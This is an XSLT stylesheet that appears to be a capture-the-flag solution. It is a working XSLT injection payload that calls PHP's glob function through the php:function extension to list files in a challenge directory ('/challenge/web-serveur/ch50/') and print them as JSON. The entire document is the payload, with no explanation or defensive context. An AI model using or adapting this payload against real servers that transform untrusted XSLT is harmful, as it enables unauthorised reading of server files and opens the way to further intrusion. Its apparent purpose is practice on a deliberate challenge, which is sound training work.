<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">
  <xsl:output method="html"/>
  <xsl:template match="/">
    <pre>
<xsl:value-of select="php:function('json_encode', php:function('glob', '/challenge/web-serveur/ch50/*'))"/>
    </pre>
  </xsl:template>
</xsl:stylesheet>
